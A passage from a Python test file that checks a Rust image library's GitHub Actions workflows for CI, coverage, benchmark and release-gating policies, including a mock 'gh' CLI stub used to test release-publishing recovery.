                "CI documentation job and steps must not allow errors",
            ),
        )
        for old, new, expected in mutations:
            with self.subTest(expected=expected):
                self.assertIn(old, workflow)
                mutated = workflow.replace(old, new, 1)
                violations = check_workflows.ci_required_checks_violations(mutated)
                self.assertTrue(
                    any(expected in violation for violation in violations),
                    violations,
                )

    def test_pages_artifact_handoff_survives_failed_job_retries(self) -> None:
        workflow_path = (
            Path(__file__).resolve().parent.parent
            / ".github"
            / "workflows"
            / "docs.yml"
        )
        workflow = workflow_path.read_text(encoding="utf-8")
        self.assertEqual(check_workflows.artifact_upload_rerun_violations(workflow), [])

        static_upload_name = workflow.replace(
            "name: ${{ steps.pages-artifact.outputs.name }}",
            "name: github-pages",
            1,
        )
        self.assertTrue(
            any(
                "GitHub Pages upload must use the attempt-specific build output"
                in violation
                for violation in check_workflows.artifact_upload_rerun_violations(
                    static_upload_name
                )
            )
        )

        fixed_attempt_name = workflow.replace(
            'name=github-pages-${GITHUB_RUN_ATTEMPT}',
            'name=github-pages',
            1,
        )
        self.assertIn(
            "GitHub Pages artifact name must include GITHUB_RUN_ATTEMPT",
            check_workflows.artifact_upload_rerun_violations(fixed_attempt_name),
        )

        hidden_job_output = workflow.replace(
            "pages_artifact: ${{ steps.pages-artifact.outputs.name }}",
            "pages_artifact: github-pages",
            1,
        )
        self.assertIn(
            "GitHub Pages attempt-specific name must be exposed as a build output",
            check_workflows.artifact_upload_rerun_violations(hidden_job_output),
        )

        mismatched_deployment = workflow.replace(
            "artifact_name: ${{ needs.build.outputs.pages_artifact }}",
            "artifact_name: github-pages",
            1,
        )
        self.assertIn(
            "GitHub Pages deployment must use the successful build's artifact output",
            check_workflows.artifact_upload_rerun_violations(mismatched_deployment),
        )

    def test_ci_supply_chain_job_has_bounded_timeout(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "ci.yml")
        contents = workflow.read_text(encoding="utf-8")
        match = re.search(
            r"(?ms)^  supply-chain:\n(?P<body>.*?)(?=^  [A-Za-z0-9_-]+:\s*$|\Z)",
            contents,
        )
        self.assertIsNotNone(match, "CI must retain the supply-chain job")
        self.assertRegex(match.group("body"), r"(?m)^    timeout-minutes: 20$")

    def test_apple_arm64_oracle_jobs_pin_runner_and_architecture_guard(self) -> None:
        workflow_dir = (
            Path(__file__).resolve().parent.parent / ".github" / "workflows"
        )
        workflows = {
            workflow_name: (workflow_dir / workflow_name).read_text(
                encoding="utf-8"
            )
            for workflow_name in check_workflows.APPLE_ARM64_ORACLE_JOBS
        }
        self.assertEqual(
            check_workflows.apple_arm64_runner_violations(workflows), []
        )

        def mutate_job(
            workflow: str, job_name: str, old: str, new: str
        ) -> str:
            pattern = re.compile(
                rf"(?ms)^(  {re.escape(job_name)}:\n)"
                r"(?P<body>.*?)(?=^  [A-Za-z0-9_-]+:\s*$|\Z)"
            )
            match = pattern.search(workflow)
            self.assertIsNotNone(match, f"missing {job_name} job")
            body = match.group("body")
            self.assertIn(old, body, f"missing expected text in {job_name} job")
            return (
                workflow[:match.start("body")]
                + body.replace(old, new, 1)
                + workflow[match.end("body"):]
            )

        for workflow_name, job_names in (
            check_workflows.APPLE_ARM64_ORACLE_JOBS.items()
        ):
            for job_name in job_names:
                for old, new, expected in (
                    (
                        "runs-on: macos-15",
                        "runs-on: macos-latest",
                        f"{workflow_name} {job_name} must run on macos-15",
                    ),
                    (
                        'run: test "$(uname -m)" = arm64',
                        'run: test "$(uname -m)" = x86_64',
                        f"{workflow_name} {job_name} must verify an arm64 runner",
                    ),
                ):
                    with self.subTest(
                        workflow=workflow_name, job=job_name, change=old
                    ):
                        mutated = dict(workflows)
                        mutated[workflow_name] = mutate_job(
                            workflows[workflow_name], job_name, old, new
                        )
                        self.assertIn(
                            expected,
                            check_workflows.apple_arm64_runner_violations(mutated),
                        )

        ci_workflow = workflows["ci.yml"]
        guard_step = (
            '      - name: Confirm Apple silicon runner\n'
            '        run: test "$(uname -m)" = arm64\n'
        )
        reordered = ci_workflow.replace(guard_step, "", 1)
        setup_step = "      - uses: actions/setup-python@"
        setup_index = reordered.index(setup_step)
        next_step_index = reordered.index(
            "      - ", setup_index + len(setup_step)
        )
        reordered = (
            reordered[:next_step_index]
            + guard_step
            + reordered[next_step_index:]
        )
        moved_guard = dict(workflows)
        moved_guard["ci.yml"] = reordered
        self.assertIn(
            "ci.yml quality must verify arm64 before substantive steps",
            check_workflows.apple_arm64_runner_violations(moved_guard),
        )

    def test_windows_msvc_lane_runs_all_feature_checks_and_parity(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "ci.yml")
        contents = workflow.read_text(encoding="utf-8")
        match = re.search(
            r"(?ms)^  windows-msvc:\n(?P<body>.*?)(?=^  [A-Za-z0-9_-]+:\s*$|\Z)",
            contents,
        )
        self.assertIsNotNone(match, "CI must retain the Windows MSVC runtime job")
        job = match.group("body")
        self.assertIn("runs-on: windows-2025", job)
        self.assertIn("name: Record Windows, MSVC, and SDK versions", job)
        self.assertIn("MSVC toolset:", job)
        self.assertIn("Windows SDK versions:", job)
        self.assertIn('RUSTC_WRAPPER: ""', job)
        self.assertIn("run: cargo check --workspace --all-features --locked", job)
        self.assertIn(
            "run: cargo clippy --workspace --all-targets --all-features --locked -- -D warnings",
            job,
        )
        self.assertIn("run: cargo test --workspace --all-features --locked", job)
        self.assertNotRegex(job, r"(?m)^\s+(?:if|continue-on-error):")

    def test_x86_simd_benchmark_pins_and_records_ubuntu_apt_snapshot(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "benchmark-x86.yml")
        contents = workflow.read_text(encoding="utf-8")
        match = re.search(
            r"(?ms)^  x86-simd:\n(?P<body>.*?)(?=^  [A-Za-z0-9_-]+:\s*$|\Z)",
            contents,
        )
        self.assertIsNotNone(match, "benchmark must retain the x86 SIMD job")
        job = match.group("body")
        self.assertIn("UBUNTU_APT_SNAPSHOT: '20261017T000000Z'", job)
        self.assertIn("-o Acquire::Retries=3", job)
        self.assertIn("-o APT::Update::Error-Mode=any", job)
        self.assertIn('update --snapshot "$UBUNTU_APT_SNAPSHOT"', job)
        self.assertIn("for attempt in 1 2 3; do", job)
        self.assertIn("Keep Release metadata between attempts", job)
        self.assertNotIn("find /var/lib/apt/lists", job)
        self.assertIn(
            "sudo apt-get --simulate --yes --snapshot \"$UBUNTU_APT_SNAPSHOT\" install",
            job,
        )
        self.assertIn("cmake=3.28.3-1build7 nasm=2.16.01-1build1", job)
        self.assertIn('sleep "$((attempt * 10))"', job)
        self.assertIn(
            'sudo apt-get -o Acquire::Retries=3 install --yes --snapshot '
            '"$UBUNTU_APT_SNAPSHOT"',
            job,
        )
        self.assertIn(
            "printf 'ubuntu_apt_snapshot=%s\\n' \"$UBUNTU_APT_SNAPSHOT\"",
            job,
        )

    def test_x86_simd_benchmark_runs_on_relevant_pull_requests_only(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "benchmark-x86.yml")
        contents = workflow.read_text(encoding="utf-8")
        pull_request = re.search(
            r"(?ms)^  pull_request:\n(?P<body>.*?)(?=^  [A-Za-z0-9_-]+:|^jobs:)",
            contents,
        )
        self.assertIsNotNone(pull_request, "benchmark must run on relevant PRs")
        paths = pull_request.group("body")
        for path in (
            "benchmarks/jpeg-production/**",
            "src/codecs/jpeg/**",
            "src/codecs/mod.rs",
            "src/capabilities.rs",
            "src/cancel.rs",
            "src/decode_policy.rs",
            "src/diagnostic.rs",
            "src/encode_policy.rs",
            "src/lib.rs",
            "src/types/**",
        ):
            with self.subTest(path=path):
                self.assertIn(f"- '{path}'", paths)
        for path in ("docs.mk", "scripts/docs_evidence.py"):
            with self.subTest(path=path):
                self.assertNotIn(
                    f"- '{path}'",
                    paths,
                    "docs-only changes are exercised by Documentation, not the x86 benchmark",
                )

        jobs = check_workflows.workflow_jobs(contents)
        self.assertIsNotNone(jobs)
        self.assertEqual(set(jobs), {"x86-simd"})
        self.assertIsNone(
            check_workflows.workflow_job_condition(jobs["x86-simd"]),
            "the paired x86 benchmark must run for matching pull requests",
        )

        publisher = (Path(__file__).resolve().parent.parent
                     / ".github" / "workflows" / "benchmark.yml").read_text(
                         encoding="utf-8"
                     )
        publisher_jobs = check_workflows.workflow_jobs(publisher)
        self.assertEqual(
            set(publisher_jobs),
            {"benchmark"},
            "the docs snapshot publisher must not depend on the x86 lane",
        )
        documentation = (Path(__file__).resolve().parent.parent
                         / ".github" / "workflows" / "docs.yml").read_text(
                             encoding="utf-8"
                         )
        x86_workflow_name = re.search(r"(?m)^name: (.+)$", contents).group(1)
        self.assertNotIn(
            x86_workflow_name,
            re.search(r"(?m)^    workflows: \[(.+)\]$", documentation).group(1),
            "an x86-only failure must not suppress the published ARM benchmark snapshot",
        )

    def test_main_benchmark_refreshes_after_docs_exporter_changes(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "benchmark.yml")
        contents = workflow.read_text(encoding="utf-8")
        push = re.search(
            r"(?ms)^  push:\n(?P<body>.*?)(?=^  [A-Za-z0-9_-]+:|^  pull_request:)",
            contents,
        )
        self.assertIsNotNone(push, "benchmark must refresh on relevant main pushes")
        paths = push.group("body")
        for path in ("docs.mk", "scripts/docs_evidence.py"):
            with self.subTest(path=path):
                self.assertIn(f"- '{path}'", paths)

    def test_benchmark_cancels_only_superseded_pull_request_runs(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "benchmark-x86.yml")
        contents = workflow.read_text(encoding="utf-8")
        self.assertRegex(
            contents,
            r"(?m)^  cancel-in-progress: \$\{\{ github\.event_name == 'pull_request' \}\}$",
            "only superseded PR benchmarks should be canceled",
        )

    def test_release_coverage_is_required_before_publishing(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "release.yml")
        self.assertEqual(
            check_workflows.release_coverage_gate_violations(
                workflow.read_text(encoding="utf-8")
            ),
            [],
        )

    def test_release_cannot_publish_when_tag_coverage_is_skipped(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "needs: [preflight, release-coverage]", "needs: preflight"
        )
        self.assertEqual(
            check_workflows.release_coverage_gate_violations(workflow),
            ["publish must depend on release-coverage"],
        )

    def test_release_coverage_must_execute_make_instead_of_printing_its_name(self) -> None:
        for no_op in ('echo "make coverage"', "# make coverage"):
            with self.subTest(run=no_op):
                workflow = self.VALID_RELEASE_WORKFLOW.replace(
                    "run: make coverage", f"run: {no_op}"
                )
                self.assertIn(
                    "release-coverage must execute make coverage",
                    check_workflows.release_coverage_gate_violations(workflow),
                )

    def test_release_coverage_command_cannot_ignore_failure(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "run: make coverage", "run: make coverage || true"
        )
        self.assertIn(
            "release-coverage must not ignore make coverage failures",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_must_propagate_failures_when_errexit_is_disabled(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "run: make coverage",
            "run: |\n          set +e\n          make coverage 2>&1 | tee coverage.log\n          set -e",
        )
        self.assertIn(
            "release-coverage must propagate failures while errexit is disabled",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_job_cannot_be_conditionally_skipped(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "  release-coverage:\n",
            "  release-coverage:\n    if: github.event_name == 'workflow_dispatch'\n",
        )
        self.assertIn(
            "release-coverage must not be conditionally skipped",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_step_cannot_be_conditionally_skipped(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "      - name: Measure coverage\n",
            "      - if: false\n        name: Measure coverage\n",
        )
        self.assertIn(
            "make coverage step must not be conditionally skipped",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_publish_cannot_ignore_failed_coverage_dependencies(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "  publish:\n",
            "  publish:\n    if: always()\n",
        )
        self.assertIn(
            "publish must use the default successful-dependencies condition",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_cannot_ignore_failure(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "      - name: Measure coverage\n",
            "      - continue-on-error: true\n        name: Measure coverage\n",
        )
        self.assertIn(
            "make coverage step must not ignore failures",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_release_coverage_cannot_check_out_main_instead_of_the_tag(self) -> None:
        workflow = self.VALID_RELEASE_WORKFLOW.replace(
            "      - uses: actions/checkout@123\n",
            "      - uses: actions/checkout@123\n        with:\n          ref: main\n",
        )
        self.assertIn(
            "release-coverage checkout must use the tag event commit",
            check_workflows.release_coverage_gate_violations(workflow),
        )

    def test_ci_aggregate_coverage_runs_only_on_allowed_triggers(self) -> None:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "ci.yml").read_text(
            encoding="utf-8"
        )
        self.assertEqual(check_workflows.ci_coverage_gate_violations(workflow), [])
        for event in ("schedule", "workflow_dispatch"):
            with self.subTest(event=event):
                self.assertTrue(check_workflows.coverage_event_is_allowed(event))
        for event in ("push", "pull_request", "workflow_run"):
            with self.subTest(event=event):
                self.assertFalse(check_workflows.coverage_event_is_allowed(event))

        widened = workflow.replace(
            "github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'",
            "always()",
        )
        self.assertIn(
            "CI aggregate coverage must run only on schedule or workflow_dispatch",
            check_workflows.ci_coverage_gate_violations(widened),
        )
        missing_manual_trigger = workflow.replace("  workflow_dispatch:\n", "")
        self.assertIn(
            "CI workflow must declare the workflow_dispatch trigger",
            check_workflows.ci_coverage_gate_violations(missing_manual_trigger),
        )
        skipped_coverage = workflow.replace(
            '          make coverage 2>&1 | tee "$log_file"',
            '          echo make coverage 2>&1 | tee "$log_file"',
        )
        self.assertIn(
            "CI aggregate coverage job must execute make coverage",
            check_workflows.ci_coverage_gate_violations(skipped_coverage),
        )

    def test_ci_x86_parity_coverage_is_verified_and_uploaded(self) -> None:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "ci.yml").read_text(
            encoding="utf-8"
        )
        self.assertEqual(
            check_workflows.ci_x86_coverage_violations(workflow), []
        )

        without_selector_gate = workflow.replace(
            "name: Verify x86 coverage selectors resolve to runnable tests",
            "name: Disabled x86 coverage selector check",
        )
        self.assertIn(
            "CI x86 coverage selector check must be defined exactly once",
            check_workflows.ci_x86_coverage_violations(without_selector_gate),
        )

        without_fault_selector = workflow.replace(
            "            test_fault_contract_matrix; do\n",
            "            ; do\n",
            1,
        )
        self.assertIn(
            "CI x86 coverage selector check must require "
            "test_fault_contract_matrix exactly once",
            check_workflows.ci_x86_coverage_violations(without_fault_selector),
        )

        for profile, _, suffix in check_workflows.CI_X86_COVERAGE_PROFILES:
            for report_prefix, test_name in check_workflows.CI_X86_COVERAGE_RUNS:
                report = f"{report_prefix}-x86_64{suffix}.json"
                command = (
                    '          cargo +"$COVERAGE_TOOLCHAIN" llvm-cov test '
                    "--all-features --branch --locked --json \\\n"
                    f"            --output-path target/release-evidence/{report} \\\n"
                    f"            --test coverage_matrix_tests {test_name} -- --exact\n"
                )
                without_run = workflow.replace(command, "", 1)
                with self.subTest(profile=profile, report=report, gate="run"):
                    self.assertNotEqual(without_run, workflow)
                    self.assertIn(
                        f"CI {profile} parity step must produce exactly once: {report}",
                        check_workflows.ci_x86_coverage_violations(without_run),
                    )

        unchecked_report = "coverage-jpeg-encode-x86_64.json"
        without_report_check = workflow.replace(
            f"            target/release-evidence/{unchecked_report} \\\n", "", 1
        )
        self.assertIn(
            f"CI coverage verification must require {unchecked_report}",
            check_workflows.ci_x86_coverage_violations(without_report_check),
        )

        unuploaded_report = "coverage-avif-encode-x86_64-avx2.json"
        without_report_upload = workflow.replace(
            f"            target/release-evidence/{unuploaded_report}\n", "", 1
        )
        self.assertIn(
            f"CI x86 artifact must retain {unuploaded_report}",
            check_workflows.ci_x86_coverage_violations(without_report_upload),
        )

    def test_documentation_publication_uses_the_trusted_workflow_run_gate(self) -> None:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "docs.yml").read_text(
            encoding="utf-8"
        )
        self.assertEqual(
            check_workflows.docs_workflow_run_publication_violations(workflow), []
        )

        trusted_benchmark = {
            "name": "Benchmark",
            "event": "push",
            "status": "completed",
            "conclusion": "success",
            "head_branch": "main",
            "head_repository": {"full_name": "appunni-m/image-slash-star"},
        }
        trusted_release = {
            **trusted_benchmark,
            "name": "Release",
            "event": "push",
            "head_branch": "v0.1.0",
        }
        self.assertTrue(
            check_workflows.docs_workflow_run_is_publishable(
                "workflow_run", trusted_benchmark, "appunni-m/image-slash-star"
            )
        )
        self.assertTrue(
            check_workflows.docs_workflow_run_is_publishable(
                "workflow_run", trusted_release, "appunni-m/image-slash-star"
            )
        )

        rejected_runs = [
            ("push", trusted_benchmark),
            ("workflow_run", {**trusted_benchmark, "status": "in_progress"}),
            ("workflow_run", {**trusted_benchmark, "conclusion": "failure"}),
            (
                "workflow_run",
                {
                    **trusted_benchmark,
                    "head_repository": {"full_name": "fork/image-slash-star"},
                },
            ),
            ("workflow_run", {**trusted_benchmark, "head_branch": "feature/docs"}),
            ("workflow_run", {**trusted_release, "event": "workflow_dispatch"}),
            ("workflow_run", {**trusted_release, "head_branch": "main"}),
            ("workflow_run", {**trusted_benchmark, "name": "Other workflow"}),
        ]
        for event_name, run in rejected_runs:
            with self.subTest(event_name=event_name, run=run):
                self.assertFalse(
                    check_workflows.docs_workflow_run_is_publishable(
                        event_name, run, "appunni-m/image-slash-star"
                    )
                )

    def test_documentation_gate_rejects_policy_broadening(self) -> None:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "docs.yml").read_text(
            encoding="utf-8"
        )
        mutations = (
            (
                "github.event.workflow_run.conclusion == 'success'",
                "github.event.workflow_run.conclusion == 'failure'",
            ),
            (
                "github.event.workflow_run.head_repository.full_name == github.repository",
                "github.event.workflow_run.head_repository.full_name != github.repository",
            ),
            (
                "github.event.workflow_run.head_branch == 'main'",
                "github.event.workflow_run.head_branch == 'preview'",
            ),
            (
                "startsWith(github.event.workflow_run.head_branch, 'v')",
                "startsWith(github.event.workflow_run.head_branch, 'release-')",
            ),
        )
        for before, after in mutations:
            with self.subTest(mutation=before):
                self.assertIn(before, workflow)
                broadened = workflow.replace(before, after)
                self.assertTrue(
                    check_workflows.docs_workflow_run_publication_violations(
                        broadened
                    )
                )

        concurrency_start = workflow.index("concurrency:\n")
        jobs_start = workflow.index("jobs:\n", concurrency_start)
        concurrency = workflow[concurrency_start:jobs_start]
        broadened_concurrency = concurrency.replace(
            "github.event_name == 'workflow_run' &&",
            "github.event_name == 'push' &&",
            1,
        )
        broadened_workflow = (
            workflow[:concurrency_start]
            + broadened_concurrency
            + workflow[jobs_start:]
        )
        self.assertTrue(
            check_workflows.docs_workflow_run_publication_violations(
                broadened_workflow
            )
        )

        deploy_start = workflow.index("  deploy:\n")
        examples_start = workflow.index("  examples:\n", deploy_start)
        deploy_job = workflow[deploy_start:examples_start]
        bypassed = deploy_job.replace(
            "github.event_name != 'workflow_run' ||", "always() ||"
        )
        self.assertNotEqual(deploy_job, bypassed)
        bypassed_workflow = workflow[:deploy_start] + bypassed + workflow[examples_start:]
        self.assertTrue(
            check_workflows.docs_workflow_run_publication_violations(
                bypassed_workflow
            )
        )

    def test_release_preflight_rebuilds_only_after_candidate_download_failure(self) -> None:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "release.yml").read_text(
            encoding="utf-8"
        )
        self.assertEqual(
            check_workflows.release_candidate_fallback_violations(workflow), []
        )

        missing_run_guard = workflow.replace('          test -n "$run_id"\n', "")
        self.assertIn(
            "release preflight must select successful main CI for the exact tagged commit",
            check_workflows.release_candidate_fallback_violations(missing_run_guard),
        )
        missing_download_recovery = workflow.replace(
            "        continue-on-error: true\n        uses: actions/download-artifact@",
            "        uses: actions/download-artifact@",
        )
        self.assertIn(
            "candidate download failure must enable the verified rebuild",
            check_workflows.release_candidate_fallback_violations(
                missing_download_recovery
            ),
        )
        wrong_fallback = workflow.replace(
            "if: steps.candidate-artifact.outcome == 'failure'",
            "if: always()",
        )
        self.assertIn(
            "candidate rebuild must run only when artifact download fails",
            check_workflows.release_candidate_fallback_violations(wrong_fallback),
        )
        unverified_fallback = workflow.replace(
            "RELEASE_TAG=\"$GITHUB_REF_NAME\" make package-verify PYTHON=python3",
            "make package-verify PYTHON=python3",
        )
        self.assertIn(
            "candidate rebuild must run tagged package verification",
            check_workflows.release_candidate_fallback_violations(unverified_fallback),
        )
        wrong_download_source = workflow.replace(
            "run-id: ${{ steps.ci-run.outputs.run-id }}",
            "run-id: ${{ github.run_id }}",
        )
        self.assertIn(
            "candidate download must use the successful main CI run",
            check_workflows.release_candidate_fallback_violations(wrong_download_source),
        )

        fallback_start = workflow.index(
            "      - name: Rebuild and verify the candidate when the CI artifact is unavailable\n"
        )
        checksum_start = workflow.index("      - name: Verify candidate bundle\n")
        upload_start = workflow.index("      - name: Retain verified candidate bundle\n")
        fallback_step = workflow[fallback_start:checksum_start]
        checksum_step = workflow[checksum_start:upload_start]
        reordered = (
            workflow[:fallback_start]
            + checksum_step
            + fallback_step
            + workflow[upload_start:]
        )
        self.assertIn(
            "candidate checksum must run after the download/rebuild paths",
            check_workflows.release_candidate_fallback_violations(reordered),
        )


class GitHubReleaseRecoveryTests(unittest.TestCase):
    TAG = "v0.1.3"
    REPOSITORY = "appunni-m/image-slash-star"
    COMMIT = "a" * 40
    TAG_OBJECT = "b" * 40
    GH_STUB = """#!/usr/bin/env python3
import json
import os
from pathlib import Path
import sys

state_path = Path(os.environ["GH_STATE"])
state = json.loads(state_path.read_text(encoding="utf-8"))
args = sys.argv[1:]
state.setdefault("calls", []).append(args)

def save():
    state_path.write_text(json.dumps(state), encoding="utf-8")

def fail(message):
    save()
    print(message, file=sys.stderr)
    raise SystemExit(1)

if args[:1] == ["api"]:
    endpoint = args[1]
    if "/git/ref/tags/" in endpoint:
        print(json.dumps({"object": {"type": "tag", "sha": os.environ["TAG_OBJECT"]}}))
    elif "/git/tags/" in endpoint:
        print(json.dumps({
            "object": {"type": "commit", "sha": state.get("tag_commit", os.environ["GITHUB_SHA"])}
        }))
    elif "/releases/tags/" in endpoint:
        if state.get("api_failure"):
            fail("gh: Forbidden (HTTP 403)")
        if state.get("release") is None:
            fail("gh: Not Found (HTTP 404)")
        print(json.dumps(state["release"]))
    else:
        fail("unexpected API endpoint")
    save()
elif args[:2] == ["release", "create"]:
    tag = args[2]
    def option(flag):
        return args[args.index(flag) + 1]
    release = {
        "tag_name": tag,
        "name": option("--title"),
        "body": Path(option("--notes-file")).read_text(encoding="utf-8"),
        "draft": "--draft" in args,
        "prerelease": "--prerelease" in args,
        "assets": [],
    }
    if state.get("create_mode") != "fail-before":
        state["release"] = release
        state.setdefault("asset_data", {})
    save()
    if state.get("create_mode") in {"ambiguous", "fail-before"}:
        fail("simulated release-create response loss")
elif args[:2] == ["release", "upload"]:
    paths = []
    skip_repo = False
    for value in args[3:]:
        if skip_repo:
            skip_repo = False
        elif value == "--repo":
            skip_repo = True
        elif not value.startswith("--"):
            paths.append(value)
    for index, path in enumerate(paths):
        asset_path = Path(path)
        name = asset_path.name
        state["release"].setdefault("assets", []).append({
            "name": name,
            "state": "uploaded",
        })
        state.setdefault("asset_data", {})[name] = asset_path.read_bytes().hex()
        save()
        if state.get("upload_mode") == "partial" and index == 0:
            fail("simulated partial asset upload")
    if state.get("upload_mode") == "ambiguous":
        fail("simulated upload response loss")
elif args[:2] == ["release", "download"]:
    tag = args[2]
    directory = Path(args[args.index("--dir") + 1])
    patterns = [
        args[index + 1]
        for index, value in enumerate(args)
        if value == "--pattern"
    ]
    for name in patterns:
        if name not in state.get("asset_data", {}):
            fail(f"missing mock asset data for {name}")
        (directory / name).write_bytes(bytes.fromhex(state["asset_data"][name]))
    save()
elif args[:2] == ["release", "edit"]:
    if "--draft=false" not in args:
        fail("unexpected release edit")
    state["release"]["draft"] = False
    save()
    if state.get("publish_mode") == "ambiguous":
        fail("simulated release-publish response loss")
else:
    fail("unexpected gh command: " + repr(args))
"""

    def setUp(self) -> None:
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name)
        self.runner_temp = self.root / "runner-temp"
        self.runner_temp.mkdir()
        self.bin_dir = self.root / "bin"
        self.bin_dir.mkdir()
        stub = self.bin_dir / "gh"
        stub.write_text(self.GH_STUB, encoding="utf-8")
        stub.chmod(0o755)

        bundle = self.root / "registry-bundle"
        bundle.mkdir()
        self.crate_name = "image-slash-star-0.1.3.crate"
        crate_path = bundle / self.crate_name
        crate_path.write_bytes(b"canonical registry crate bytes")
        crate_digest = hashlib.sha256(crate_path.read_bytes()).hexdigest()
        (bundle / "SHA256SUMS").write_text(
            f"{crate_digest}  {self.crate_name}\n",
            encoding="utf-8",
        )
        (bundle / "release-notes.md").write_text(
            "Release notes for the verified candidate.\n",
            encoding="utf-8",
        )
        checksums_digest = hashlib.sha256(
            (bundle / "SHA256SUMS").read_bytes()
        ).hexdigest()
        self.expected_body = (
            (bundle / "release-notes.md").read_text(encoding="utf-8")
            + "\n"
            + f"<!-- image-slash-star-release tag={self.TAG} commit={self.COMMIT} "
            + f"crate-sha256={crate_digest} checksums-sha256={checksums_digest} -->\n"
        )
        self.bundle_assets = {
            self.crate_name: crate_path.read_bytes(),
            "SHA256SUMS": (bundle / "SHA256SUMS").read_bytes(),
        }
        self.publish_script = self.workflow_publish_script()
        self.state_path = self.root / "gh-state.json"

    def tearDown(self) -> None:
        self.temp.cleanup()

    @classmethod
    def workflow_publish_script(cls) -> str:
        root = Path(__file__).resolve().parent.parent
        workflow = (root / ".github" / "workflows" / "release.yml").read_text(
            encoding="utf-8"
        )
        job = check_workflows.workflow_jobs(workflow)["github-release"]
        step = next(
            item
            for item in re.split(r"(?m)^      - ", job)
            if item.startswith("name: Create GitHub prerelease")
        )
        script = check_workflows.run_script(step)
        if script is None:
            raise AssertionError("GitHub release step has no inline script")
        return script

    def make_release(
        self,
        *,
        draft: bool,
        assets: tuple[str, ...] = (),
        overrides: dict[str, object] | None = None,
        asset_bytes: dict[str, bytes] | None = None,
    ) -> dict[str, object]:
        release: dict[str, object] = {
            "tag_name": self.TAG,
            "name": "image-slash-star 0.1.3",
            "body": self.expected_body,
            "draft": draft,
            "prerelease": True,
            "assets": [{"name": name, "state": "uploaded"} for name in assets],
        }
        if overrides:
            release.update(overrides)
        available_bytes = asset_bytes if asset_bytes is not None else self.bundle_assets
        return {
            "release": release,
            "asset_data": {
                name: available_bytes[name].hex()
                for name in assets
                if name in available_bytes
            },
        }

    def run_script(
        self,
        state: dict[str, object],
        *,
        tag_commit: str | None = None,
    ) -> tuple[subprocess.CompletedProcess[str], dict[str, object]]:
        self.state_path.write_text(json.dumps(state), encoding="utf-8")
        env = os.environ.copy()
        env.update(
            {
                "GH_STATE": str(self.state_path),
                "GH_REPO": self.REPOSITORY,
                "GH_TOKEN": "test-token",
                "GITHUB_REPOSITORY": self.REPOSITORY,
                "GITHUB_REF_NAME": self.TAG,
                "GITHUB_SHA": self.COMMIT,
                "VERIFIED_TAG_COMMIT": tag_commit or self.COMMIT,
                "TAG_OBJECT": self.TAG_OBJECT,
                "GITHUB_RUN_ID": "42",
                "GITHUB_RUN_ATTEMPT": "1",
                "RUNNER_TEMP": str(self.runner_temp),
                "PATH": str(self.bin_dir) + os.pathsep + env["PATH"],
            }
        )
        result = subprocess.run(
            ["bash", "-c", self.publish_script],
            cwd=self.root,
            env=env,
            check=False,
            text=True,
            capture_output=True,
        )
        final_state = json.loads(self.state_path.read_text(encoding="utf-8"))
        return result, final_state

    def test_absent_release_is_created_as_draft_then_verified_and_published(self) -> None:
        result, state = self.run_script({"release": None})

        self.assertEqual(result.returncode, 0, result.stderr)
        release = state["release"]
        self.assertFalse(release["draft"])
        self.assertEqual(release["body"], self.expected_body)
        self.assertEqual(
            sorted(asset["name"] for asset in release["assets"]),
            sorted(self.bundle_assets),
        )
        commands = state["calls"]
        create = next(call for call in commands if call[:2] == ["release", "create"])
        self.assertIn("--draft", create)
        self.assertTrue(any(call[:2] == ["release", "upload"] for call in commands))
        self.assertTrue(any(call[:2] == ["release", "edit"] for call in commands))
        self.assertFalse(any("--clobber" in call or "delete" in call for call in commands))

    def test_ambiguous_create_response_recovers_from_the_matching_draft(self) -> None:
        result, state = self.run_script(
            {"release": None, "create_mode": "ambiguous"}
        )

        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(state["release"]["draft"])
        self.assertIn("checking whether GitHub accepted it", result.stderr)

    def test_pre_attestation_commit_mismatch_fails_before_release_mutation(self) -> None:
        result, state = self.run_script(
            {"release": None},
            tag_commit="c" * 40,
        )

        self.assertNotEqual(result.returncode, 0)
        self.assertIn("pre-attestation tag check did not resolve", result.stderr)
        self.assertIsNone(state["release"])
        self.assertEqual(state.get("calls", []), [])

    def test_matching_published_release_is_verified_without_mutation(self) -> None:
        state = self.make_release(draft=False, assets=tuple(self.bundle_assets))
        result, final_state = self.run_script(state)

        self.assertEqual(result.returncode, 0, result.stderr)
        commands = final_state["calls"]
        self.assertFalse(any(call[:2] == ["release", "create"] for call in commands))
        self.assertFalse(any(call[:2] == ["release", "upload"] for call in commands))
        self.assertFalse(any(call[:2] == ["release", "edit"] for call in commands))

    def test_matching_partial_draft_uploads_only_missing_asset_then_publishes(self) -> None:
